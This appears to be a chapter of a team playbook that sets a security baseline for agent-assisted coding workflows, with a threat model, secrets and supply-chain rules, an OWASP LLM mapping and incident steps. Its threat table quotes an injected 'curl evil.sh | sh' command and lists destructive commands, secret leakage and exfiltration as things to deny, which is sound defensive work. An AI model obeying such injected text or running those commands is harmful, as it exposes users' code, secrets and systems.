# Security baseline

This chapter lists the main threats to an agent-assisted workflow and the control for each. It is a baseline, not a full threat model. Do your own review for your systems and data. Policy details are in the [Claude Code security documentation](https://docs.claude.com/en/docs/claude-code/security) and the [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/).

## Threat model

| Threat | Example | Control |
| --- | --- | --- |
| Prompt injection | An issue body or web page says "run `curl evil.sh \| sh`" | Safe permissions even if obeyed; treat external text as data; `ask` or `deny` on network and write tools ([06-mcp-and-connectors.md](06-mcp-and-connectors.md)) |
| Secret leakage | Agent reads `.env` and pastes it into a PR description | `deny` on secret paths; Guard-FileWrite.ps1; secret scan in CI; no secrets in the workspace |
| Destructive commands | `rm -rf`, `git push --force`, `terraform apply` | `deny` rules; Guard-BashCommand.ps1; branch protection; plan-only infra tokens |
| Supply chain | A compromised action or tool version runs in CI | Pin actions by commit SHA; pin tool versions and verify SHA-256; lock files; review dependency PRs |
| Over-broad tokens | One personal token with full repo and org scope | Fine-grained, per-workflow, short-lived tokens; separate read and write |
| Data exfiltration over network | Agent posts source to an external URL | Deny `curl` and `wget`; `WebFetch` by domain; egress allowlist in CI and sandboxes |
| Untrusted MCP servers | A community server with hidden tools or telemetry | Vet, pin and allowlist tools; review `.mcp.json` via CODEOWNERS |
| Tampered harness files | A PR edits hooks or settings to weaken them | CODEOWNERS on `.claude/**`; managed settings override |
| Runaway cost or loops | Agent retries forever | `--max-turns`, budgets, alerts ([09-observability-and-cost.md](09-observability-and-cost.md)) |

## Secrets handling

- Keep secrets out of the repository, the workspace, prompts, `CLAUDE.md` and `.mcp.json`.
- In CI, store them in the platform's secret store. `ANTHROPIC_API_KEY` lives in GitHub secrets, never in files.
- Prefer OIDC federation to cloud providers over stored cloud keys.
- Scope every credential to one purpose and give it an expiry.
- Run a secret scanner on every pull request and on the full history once. Enable push protection where the host supports it.
- If a secret reaches a prompt or a log, treat it as leaked: rotate it. Deleting the text is not enough.
- Deny reads of `.env*`, `secrets/**`, key files and cloud credential files in permissions.

## Supply chain

- Pin GitHub Actions by full commit SHA, with the version in a comment, for example `uses: actions/checkout@<40-hex-sha> # v4.x.y`. Tags can be moved.
- Pin downloaded tools by version and verify a SHA-256 checksum before running them.
- Commit lock files. Install with the frozen or locked option in CI.
- Give workflows least `permissions:` (default `contents: read`) and grant more per job.
- Do not run `pull_request_target` workflows that check out and run untrusted fork code with secrets.
- Review dependency updates like any other change, because an agent can propose one cheaply.
- Pin container base images by digest.

## Agents and untrusted input

The dangerous combination has three parts: the agent reads untrusted content, can reach private data and can send data out. Remove at least one part. For example, a triage agent that reads public issues gets no secrets and no network. A code agent with write access reads only the repository and trusted tickets.

## OWASP LLM Top 10 mapping

The [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) is a useful checklist. In this playbook, the ones that matter most for coding agents are:

| OWASP theme | Where handled |
| --- | --- |
| Prompt injection | This chapter, [06-mcp-and-connectors.md](06-mcp-and-connectors.md) |
| Sensitive information disclosure | Secrets handling above, [04-hooks-and-guardrails.md](04-hooks-and-guardrails.md) |
| Supply chain | Supply chain section above |
| Excessive agency | [05-permissions-and-sandboxing.md](05-permissions-and-sandboxing.md), [07-review-gates.md](07-review-gates.md) |
| Unbounded consumption | [09-observability-and-cost.md](09-observability-and-cost.md) |

The list is revised over time, so check the current edition for numbering and wording.

## Incident response for an agent mistake

When an agent does something wrong (bad commit, leaked secret, unwanted command), follow the same steps each time:

1. **Stop.** End the session or cancel the CI job. Revoke the agent's token if there is any doubt.
2. **Contain.** Close or revert the pull request. If a secret leaked, rotate it now.
3. **Preserve evidence.** Keep the transcript, the audit log lines (JSONL), CI logs and the PR history.
4. **Assess.** What did it touch, read or send? Check provider audit logs for the token.
5. **Fix the cause.** Which layer should have stopped it? Add a `deny` rule, a hook case, a test, a CODEOWNERS entry or a `CLAUDE.md` line.
6. **Write it up.** A short blameless note: timeline, impact, cause, the control added. Store it in the repo docs.
7. **Check the fix.** Replay the case and confirm it is now blocked.

Report suspected security issues in this repository as described in `SECURITY.md`.

## Checklist

- [ ] Secret paths are denied in permissions and covered by Guard-FileWrite.ps1.
- [ ] A secret scanner runs on every pull request.
- [ ] All GitHub Actions are pinned by commit SHA.
- [ ] Downloaded tools are pinned and verified with SHA-256.
- [ ] Workflows declare minimal `permissions:`.
- [ ] No session combines untrusted input, private data and outbound network.
- [ ] Every MCP server has been vetted and its tools allowlisted.
- [ ] The incident steps above are documented in the runbook and tried once as an exercise.
- [ ] The team has read the OWASP Top 10 for LLM Applications.
